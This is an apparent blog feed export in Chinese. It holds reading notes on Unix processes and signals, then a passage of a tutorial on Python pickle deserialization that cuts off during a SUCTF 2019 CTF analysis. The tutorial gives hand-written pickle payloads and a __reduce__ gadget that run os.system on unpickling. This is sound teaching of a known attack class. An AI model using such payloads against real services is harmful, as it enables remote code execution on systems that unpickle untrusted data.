href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h3><h3 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h3><h3 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h3><h3 id="用户模式和内核模式"><a href="#用户模式和内核模式" class="headerlink" title="用户模式和内核模式"></a>用户模式和内核模式</h3><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><h2 id="系统调用错误处理"><a href="#系统调用错误处理" class="headerlink" title="系统调用错误处理"></a>系统调用错误处理</h2><p>参见 <code>error.h</code>，这里想说的还是对错误返回处理的封装。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>程序员角度，可认为进程总是处于三种状态之一：</p><ul><li><p>运行：进程要么在 CPU 上执行，要么在等待被执行且最终会被内核调度。</p></li><li><p>停止：进程的执行被挂起（suspended），且不会被调度，直到收到 SIGCONT 信号再次运行。</p></li><li><p>终止：进程永远地停止了。</p><p>  三种原因可使得进程停止：</p><ul><li>收到一个信号，该信号的默认行为是终止进程。</li><li>从主程序返回。</li><li>调用 exit 函数。</li></ul></li></ul><p>主要功能：对系统中的所有进程实施有效的管理，包括创建新进程、撤销已有进程、实现进程状态转换。</p><p>原语：是一种特殊的程序，执行必须一气呵成，不可中断。用开、关中断实现的。</p><p>创建进程：</p><ul><li>建立 PCB，生成 pid</li><li>初始化 PCB</li><li>加入就绪队列</li></ul><p>阻塞进程：</p><ul><li>修改 PCB 中的进程状态</li><li>现场保护</li><li>将进程加入合适的等待队列</li></ul><p>唤醒进程：</p><ul><li><p>从等待队列中移出</p></li><li><p>修改 PCB 进程状态</p></li><li><p>加入就绪队列</p></li></ul><h3 id="获取进程-ID"><a href="#获取进程-ID" class="headerlink" title="获取进程 ID"></a>获取进程 ID</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpid(<span class="keyword">void</span>);</span><br><span class="line"><span class="keyword">pid_t</span> getppid(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure><h3 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#inlcude <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h3><p>当一个进程由于某种原因终止时，内核并不是立即把它从系统中清除。相反，进程被保持在一种已终止的状态中，直到被它的父进程回收（reaped）。当父进程回收已终止的子进程时，内核将子进程的退出状态传递个父进程，然后抛弃已终止进程，从此时开始，该进程才不存在。</p><p>一个终止了但还未被回收的进程成为僵死进程（zombie）。</p><p>僵死进程已经终止了，但内核仍保留着它的某些状态直到父进程回收它为止。</p><p>一个进程可通过调用 <code>waitpid()</code> 来等待它的子进程终止或者停止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> waitpid(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span>* statusp, <span class="keyword">int</span> options);</span><br></pre></td></tr></table></figure><p>（TODO：深入整理）</p><h3 id="让进程休眠"><a href="#让进程休眠" class="headerlink" title="让进程休眠"></a>让进程休眠</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">void</span>)</span></span>;  <span class="comment">// 休眠至进程接收到一个信号</span></span><br></pre></td></tr></table></figure><h3 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h3><p><code>execve</code> 函数在当前进程的上下文加载并运行一个新程序。</p><p>而 fork 函数则是在新的子进程中运行相同的程序，新的子进程是父进程的一个复制品。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* filename, <span class="keyword">const</span> <span class="keyword">char</span>** argv, <span class="keyword">const</span> <span class="keyword">char</span>** envp)</span></span>;</span><br></pre></td></tr></table></figure><p>与 fork 一次调用两次返回不同，execve 调用一次并从不返回。</p><h2 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h2><p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的时间。在 Linux 上支持了 30 中不同类型的信号。每个信号类型都对应于某种系统事件。</p><p>低层的硬件异常是由内核异常处理程序处理的，正常情况下，对用户进程而言是不可见的。</p><p>信号提供了一种机制，通知余户进程发生了这些异常。</p><h3 id="发送"><a href="#发送" class="headerlink" title="发送"></a>发送</h3><p>内核通过更新目的进程上下文中的某个状态，发送一个信号给目的进程。</p><p>发送信号可以有如下两种原因：</p><ul><li>内核检测到一个系统事件，比如除零错误或者子进程终止。</li><li>一个进程调用了 kill 函数，显示地要求内核发送一个信号给目的进程。</li></ul><p>一个进程可以发送信号给它自己。</p><p><strong>Unix 系统发送信号的机制</strong></p><ul><li><p>进程组</p><p>  每个进程都只属于一个进程组，进程组是由一个正整数进程组 ID 来标识的。</p><p>  默认一个子进程和它父进程同属于一个进程组。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pid_t</span> getpgrp(<span class="keyword">void</span>);  <span class="comment">// 返回调用进程的进程组 ID</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;  <span class="comment">// 设置进程组成功返回 0，否则为 -1</span></span><br></pre></td></tr></table></figure></li><li><p>用 <code>/bin/kill</code> 程序</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kill -9 1023# 杀掉 1023 进程</span><br><span class="line">kill -9 -1023# 杀掉 1023 进程组的每个进程</span><br></pre></td></tr></table></figure></li><li><p>从键盘发送</p><p>  CTRL + C / Z  ：终止 / 挂起</p></li><li><p>用 kill 函数</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>用 alarm 函数发送</p><p>  进程可通过调用 alarm 函数向自己发送 SIGALRM 信号，网络编程中可拿来处理超时。</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h3><p>当目的进程被内核强迫以某种方式对信号的发送做出反应时，它就接收了信号。进程可以忽略这个信号，终止或者通过执行一个信号处理函数的用户层函数捕获这个信号。</p><h3 id="处理"><a href="#处理" class="headerlink" title="处理"></a>处理</h3><h2 id="操作进程的工具"><a href="#操作进程的工具" class="headerlink" title="操作进程的工具"></a>操作进程的工具</h2><ul><li><p>strace</p><p>  打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。</p><p>  这是一个超级牛逼的工具，比如你想跟进 PHP 内核底层实现，这就能收获大量信息。</p></li><li><p>ps</p><p>  列出当前系统中的进程（包括僵尸进程）。</p></li><li><p>top</p><p>  打印出关于当前进程资源使用的信息。</p></li><li><p>pmap</p><p>  显示进程的内存映射。</p></li><li><p>/proc</p><p>  一个虚拟文件系统，以 ASCII 文本格式输出大量内核数据结构的内容（从这也能感受到 Linux 文件的重要性），用户程序可以读取这些内容。</p><p>  （TODO：补充详细结构及其作用）</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;异常&quot;&gt;&lt;a href=&quot;#异常&quot; class=&quot;headerlink&quot; title=&quot;异常&quot;&gt;&lt;/a&gt;异常&lt;/h2&gt;&lt;p&gt;异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。&lt;/p&gt;
&lt;h2 id=&quot;进程&quot;&gt;&lt;a href=&quot;#进程&quot; clas
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Python pickle 反序列化实例分析</title>
    <link href="https://wywwzjj.top/2019/10/24/Python-pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <id>https://wywwzjj.top/2019/10/24/Python-pickle-反序列化实例分析/</id>
    <published>2019-10-24T02:26:07.000Z</published>
    <updated>2020-01-21T09:36:02.591Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前 SUCTF 出了一题 pickle 反序列化的杂项题，就感觉相当有意思。后来 Balsn 一次性搞了三个，太强了，学到了很多，感谢这些师傅。下文记录了我的学习笔记以及踩过的坑，希望对大家理解 pickle 有点帮助。</p><p>这个 PPT 一定要好好看看，非常的通俗易懂。<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><blockquote><p>Python 提供了两个库，pickle 和 cPickle（其中 cpickle 底层使用 c 语言书写）</p><p>用 pycharm 调试的话需要更改一下代码，pyckle.py 的第 1607 行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="comment"># Use the faster _pickle if possible</span></span><br><span class="line">&gt; <span class="keyword">try</span>:</span><br><span class="line">&gt;     <span class="keyword">from</span> _pickle <span class="keyword">import</span> ( ...  <span class="comment"># 这里 _pickle =&gt; pickle</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h3><ul><li>从对象中提取所有属性（<code>__dict__</code>），并将属性转为键值对</li><li>写入对象的类名</li><li>写入键值对</li></ul><h3 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h3><ul><li>获取 pickle 输入流</li><li>重建属性列表</li><li>根据保存的类名创建一个新的对象</li><li>将属性复制到新的对象中</li></ul><h2 id="pickle-是什么？"><a href="#pickle-是什么？" class="headerlink" title="pickle 是什么？"></a>pickle 是什么？</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>pickle 是一种栈语言，有不同的编写方式，基于一个轻量的 PVM（Pickle Virtual Machine）。</p><p>PVM 由三部分组成：</p><ul><li><p><strong>指令处理器</strong></p><p>  从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 <code>.</code> 这个结束符后停止。</p><p>  最终留在栈顶的值将被作为反序列化对象返回。</p></li><li><p><strong>stack</strong></p><p>  由 Python 的 <strong>list</strong> 实现，被用来临时存储数据、参数以及对象。</p></li><li><p><strong>memo</strong></p><p>  由 Python 的 <strong>dict</strong> 实现，为 PVM 的整个生命周期提供存储。</p></li></ul><p><strong>PS</strong>：注意下 stack、memo 的实现方式，方便理解下面的指令。</p><blockquote><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><ul><li>v0 版协议是原始的 “人类可读” 协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3/glossary.html#term-new-style-class" target="_blank" rel="noopener">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307" target="_blank" rel="noopener"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#bytes" target="_blank" rel="noopener"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154" target="_blank" rel="noopener"><strong>PEP 3154</strong></a>。</li></ul></blockquote><h3 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h3><blockquote><p>本文重点说明 0 号协议，不明白的指令建议直接看对应实现！</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">MARK           = <span class="string">b'('</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b'.'</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b'0'</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b'1'</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b'2'</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b'F'</span>   <span class="comment"># push float object; decimal string argument</span></span><br><span class="line">INT            = <span class="string">b'I'</span>   <span class="comment"># push integer or bool; decimal string argument</span></span><br><span class="line">BININT         = <span class="string">b'J'</span>   <span class="comment"># push four-byte signed int</span></span><br><span class="line">BININT1        = <span class="string">b'K'</span>   <span class="comment"># push 1-byte unsigned int</span></span><br><span class="line">LONG           = <span class="string">b'L'</span>   <span class="comment"># push long; decimal string argument</span></span><br><span class="line">BININT2        = <span class="string">b'M'</span>   <span class="comment"># push 2-byte unsigned int</span></span><br><span class="line">NONE           = <span class="string">b'N'</span>   <span class="comment"># push None</span></span><br><span class="line">PERSID         = <span class="string">b'P'</span>   <span class="comment"># push persistent object; id is taken from string arg</span></span><br><span class="line">BINPERSID      = <span class="string">b'Q'</span>   <span class="comment">#  "       "         "  ;  "  "   "     "  stack</span></span><br><span class="line">REDUCE         = <span class="string">b'R'</span>   <span class="comment"># apply callable to argtuple, both on stack</span></span><br><span class="line">STRING         = <span class="string">b'S'</span>   <span class="comment"># push string; NL-terminated string argument</span></span><br><span class="line">BINSTRING      = <span class="string">b'T'</span>   <span class="comment"># push string; counted binary string argument</span></span><br><span class="line">SHORT_BINSTRING= <span class="string">b'U'</span>   <span class="comment">#  "     "   ;    "      "       "      " &lt; 256 bytes</span></span><br><span class="line">UNICODE        = <span class="string">b'V'</span>   <span class="comment"># push Unicode string; raw-unicode-escaped'd argument</span></span><br><span class="line">BINUNICODE     = <span class="string">b'X'</span>   <span class="comment">#   "     "       "  ; counted UTF-8 string argument</span></span><br><span class="line">APPEND         = <span class="string">b'a'</span>   <span class="comment"># append stack top to list below it</span></span><br><span class="line">BUILD          = <span class="string">b'b'</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br><span class="line">GLOBAL         = <span class="string">b'c'</span>   <span class="comment"># push self.find_class(modname, name); 2 string args</span></span><br><span class="line">DICT           = <span class="string">b'd'</span>   <span class="comment"># build a dict from stack items</span></span><br><span class="line">EMPTY_DICT     = <span class="string">b'&#125;'</span>   <span class="comment"># push empty dict</span></span><br><span class="line">APPENDS        = <span class="string">b'e'</span>   <span class="comment"># extend list on stack by topmost stack slice</span></span><br><span class="line">GET            = <span class="string">b'g'</span>   <span class="comment"># push item from memo on stack; index is string arg</span></span><br><span class="line">BINGET         = <span class="string">b'h'</span>   <span class="comment">#   "    "    "    "   "   "  ;   "    " 1-byte arg</span></span><br><span class="line">INST           = <span class="string">b'i'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">LONG_BINGET    = <span class="string">b'j'</span>   <span class="comment"># push item from memo on stack; index is 4-byte arg</span></span><br><span class="line">LIST           = <span class="string">b'l'</span>   <span class="comment"># build list from topmost stack items</span></span><br><span class="line">EMPTY_LIST     = <span class="string">b']'</span>   <span class="comment"># push empty list</span></span><br><span class="line">OBJ            = <span class="string">b'o'</span>   <span class="comment"># build &amp; push class instance</span></span><br><span class="line">PUT            = <span class="string">b'p'</span>   <span class="comment"># store stack top in memo; index is string arg</span></span><br><span class="line">BINPUT         = <span class="string">b'q'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 1-byte arg</span></span><br><span class="line">LONG_BINPUT    = <span class="string">b'r'</span>   <span class="comment">#   "     "    "   "   " ;   "    " 4-byte arg</span></span><br><span class="line">SETITEM        = <span class="string">b's'</span>   <span class="comment"># add key+value pair to dict</span></span><br><span class="line">TUPLE          = <span class="string">b't'</span>   <span class="comment"># build tuple from topmost stack items</span></span><br><span class="line">EMPTY_TUPLE    = <span class="string">b')'</span>   <span class="comment"># push empty tuple</span></span><br><span class="line">SETITEMS       = <span class="string">b'u'</span>   <span class="comment"># modify dict by adding topmost key+value pairs</span></span><br><span class="line">BINFLOAT       = <span class="string">b'G'</span>   <span class="comment"># push float; arg is 8-byte float encoding</span></span><br><span class="line"></span><br><span class="line">TRUE           = <span class="string">b'I01\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br><span class="line">FALSE          = <span class="string">b'I00\n'</span>  <span class="comment"># not an opcode; see INT docs in pickletools.py</span></span><br></pre></td></tr></table></figure><h2 id="如何生成-pickle？"><a href="#如何生成-pickle？" class="headerlink" title="如何生成 pickle？"></a>如何生成 pickle？</h2><h3 id="手写"><a href="#手写" class="headerlink" title="手写"></a>手写</h3><p>基本模式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c<span class="tag">&lt;<span class="name">module</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">callable</span>&gt;</span></span><br><span class="line">(<span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>看个小例子：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">cos</span><br><span class="line">system</span><br><span class="line">(S<span class="string">'ls'</span></span><br><span class="line">tR.</span><br><span class="line"></span><br><span class="line">&lt;=&gt; __import__('os').system(*('ls',))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分解一下：</span></span><br><span class="line">cos</span><br><span class="line">system  =&gt;  引入 system，并将函数添加到 stack</span><br><span class="line"></span><br><span class="line">(S'ls'=&gt;  把当前 stack 存到 metastack，清空 stack，再将 'ls' 压入 stack</span><br><span class="line">t=&gt;  stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将 tuple 压入 stack</span><br><span class="line"><span class="comment"># 简单来说，(,t 之间的内容形成了一个 tuple，stack 目前是 [&lt;built-in function system&gt;, ('ls',)]</span></span><br><span class="line">R =&gt;  system(*('ls',))</span><br><span class="line">.=&gt;  结束，返回当前栈顶元素</span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="_reduce_"></a>_<em>reduce_</em></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">'ls'</span>,))</span><br><span class="line">    </span><br><span class="line">print(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'cnt\nsystem\np0\n(Vls\np1\ntp2\nRp3\n.'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>缺点：只能执行单一的函数，很难构造复杂的操作，下文的讲解都是直接写。</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="SUCTF-2019-Guess-game"><a href="#SUCTF-2019-Guess-game" class="headerlink" title="SUCTF 2019 Guess_game"></a>SUCTF 2019 Guess_game</h3><blockquote><p>完整源码：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game</a></p></blockquote><p>猜数游戏，10 以内的数字，猜对十次就返回 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: Ticket.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ticket</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, number)</span>:</span></span><br><span class="line">        self.number = number</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span><span class="params">(self, other)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> type(self) == type(other) <span class="keyword">and</span> self.number == other.number:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_valid</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> type(self.number) == int</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> number_range &gt;= self.number &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">       </span><br><span class="line"><span class="comment"># file: game_client.py</span></span><br><span class="line">number = input(<span class="string">'Input the number you guess\n&gt; '</span>)</span><br><span class="line">ticket = Ticket(number)</span><br><span class="line">ticket = pickle.dumps(ticket)</span><br><span class="line">writer.write(pack_length(len(ticket)))</span><br><span class="line">writer.write(ticket)</span><br></pre></td></tr></table></figure><p>client 端接收数字输入，生成的 Ticket 对象序列化后发送给 server 端。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file: game_server.py 有删减</span></span><br><span class="line"><span class="keyword">from</span> guess_game.Ticket <span class="keyword">import</span> Ticket</span><br><span class="line"><span class="keyword">from</span> guess_game.RestrictedUnpickler <span class="keyword">import</span> restricted_loads</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> unpack</span><br><span class="line"><span class="keyword">from</span> guess_game <span class="keyword">import</span> game</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> game.finished():</span><br><span class="line">ticket = stdin_read(length)</span><br><span class="line">    ticket = restricted_loads(ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> type(ticket) == Ticket</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ticket.is_valid():</span><br><span class="line">        print(<span class="string">'The number is invalid.'</span>)</span><br><span class="line">        game.next_game(Ticket(<span class="number">-1</span>))</span><br><span class="line">        <span 